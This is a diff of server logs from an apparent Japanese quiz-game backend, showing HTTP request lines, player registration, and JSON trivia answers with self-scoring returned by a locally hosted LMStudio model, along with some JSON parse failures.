-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "凝縮", "reasoning": "気体が液体になる過程は「凝縮」と呼ばれます。これは温度や圧力の変化によって起こる現象です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "答えは正確で、説明も簡潔かつ適切です。"}
+INFO:     127.0.0.1:58632 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45548 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45554 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45554 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50584 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "セキュリティソフト", "reasoning": "セキュリティのためのソフトは一般的に「セキュリティソフト」と呼ばれます。これは、ウイルスやマルウェアからコンピュータを保護するためのソフトウェアです。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は適切で、簡潔に問題に対する答えが示されています。"}
-INFO:     127.0.0.1:48360 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:57132 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36384 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:39116 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36350 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:53410 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48360 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36350 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:48348 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47168 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "富士山", "reasoning": "富士山は日本の最高峰であり、標高3,776メートルです。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解で、説明も適切です。"}
+INFO:     127.0.0.1:50584 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50584 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50592 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50584 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34480 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53918 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53932 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "明治維新", "reasoning": "この説明は明治維新に該当する。明治維新は、日本の近代化改革として知られ、封建制の廃止と中央集権国家への移行を特徴とする。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、説明も適切です。この問題に対する解答として非常に適切です。"}
-INFO:     127.0.0.1:38544 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47168 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60278 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60290 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48216 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48230 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:38544 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:36394 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47168 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48246 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:60296 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:58060 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:58064 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:48256 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:45372 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:44284 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:46606 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "OPTIONS /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "POST /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/submit_answer HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "OPTIONS /heartbeat HTTP/1.1" 200 OK
-INFO:     127.0.0.1:34988 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     127.0.0.1:36288 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:37692 - "GET /game/597b8728-2b9e-4d3a-b110-1fa88ca246ea/state HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42976 - "GET /status HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42976 - "POST /probe_lm HTTP/1.1" 200 OK
-player registered: 96ec6c27-e131-4b61-9fca-ece6268e704f -> sss (token=5c593772)
-INFO:     122.103.96.209:42976 - "POST /register HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42976 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42982 - "GET /bgm/menu.mp3 HTTP/1.1" 206 Partial Content
-INFO:     122.103.96.209:42976 - "GET /solo/questions?n=10 HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42982 - "GET /bgm/count_down.mp3 HTTP/1.1" 206 Partial Content
-INFO:     122.103.96.209:42982 - "GET /bgm/fighting_bgm.mp3 HTTP/1.1" 206 Partial Content
-INFO:     122.103.96.209:42976 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:54930 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56858 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56874 - "POST /heartbeat HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "Hz", "reasoning": "一秒間あたりの変化回数は「ヘルツ（Hz）」という単位で表されます。これは周波数を示す単位であり、1秒間に何回振動または変化するかを測定します。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で明確です。ヘルツ（Hz）の説明も適切に述べられており、技術的な理解が深まります。"}
+INFO:     127.0.0.1:53932 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53932 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53932 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53932 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56972 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "ヘルツ（Hz）", "reasoning": "1秒間の周期を表す単位は「ヘルツ（Hz）」です。これは、1秒あたりのサイクル数を示し、周波数の単位として用いられます。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で明確であり、技術的な説明も適切です。"}
-INFO:     122.103.96.209:56858 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56874 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56858 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "サハラ", "reasoning": "サハラ砂漠は世界最大の熱帯砂漠であり、面積が約920万平方キロメートルとされている。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で、理由も明確です。"}
+INFO:     127.0.0.1:56972 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56972 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56972 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "鎌倉幕府", "reasoning": "日本の歴史において、室町幕府は1336年に設立され、その前の時代には鎌倉幕府（1185年〜1333年）が存在しました。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確で明確です。歴史の流れを理解する上で重要な情報であり、説明も簡潔かつ適切です。"}
-INFO:     122.103.96.209:56858 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:32780 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:32786 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:56858 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47956 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47958 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47956 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47958 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:47956 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:55374 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:55374 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44650 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44654 - "POST /heartbeat HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "アフリカ大陸のサハラ砂漠", "reasoning": "サハラ砂漠は面積が約920万平方キロメートルもあり、世界最大の砂漠です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "答えは正確で、理由も明確です。"}
+INFO:     127.0.0.1:56972 - "POST /ask_ai HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56972 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51426 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51426 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51426 - "GET /server/stats HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51426 - "POST /heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46810 - "GET /server/stats HTTP/1.1" 200 OK
+Using LMStudio URL: http://192.168.0.64:1234/v1/chat/completions
 Failed to parse model JSON output: Expecting value: line 1 column 1 (char 0)
 raw:<think>
 
 </think>
 
-{"answer": "オームの法則", "reasoning": "オームの法則は、電流（I）が電圧（V）と抵抗（R）の比によって決まる関係式で、V = I × R と表されます。この法則は電気回路の基本的な原理です。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "正解であり、説明も正確です。"}
-INFO:     122.103.96.209:44650 - "POST /ask_ai HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44654 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44650 - "GET /server/stats HTTP/1.1" 200 OK
-INFO:     122.103.96.209:44650 - "POST /heartbeat HTTP/1.1" 200 OK
-INFO:     122.103.96.209:42158 - "GET /server/stats HTTP/1.1" 200 OK
-Using LMStudio URL: http://rinnas.f5.si:1234/v1/chat/completions
+{"answer": "江戸", "reasoning": "黒船は1853年にペリー提督によって日本に来航し、江戸（現在の東京）で開国を迫った。この出来事は「黒船来航」として知られている。", "valid": true, "invalid_reason": "", "score": 100, "feedback": "回答は正確であり、歴史的事実に基づいています。"}
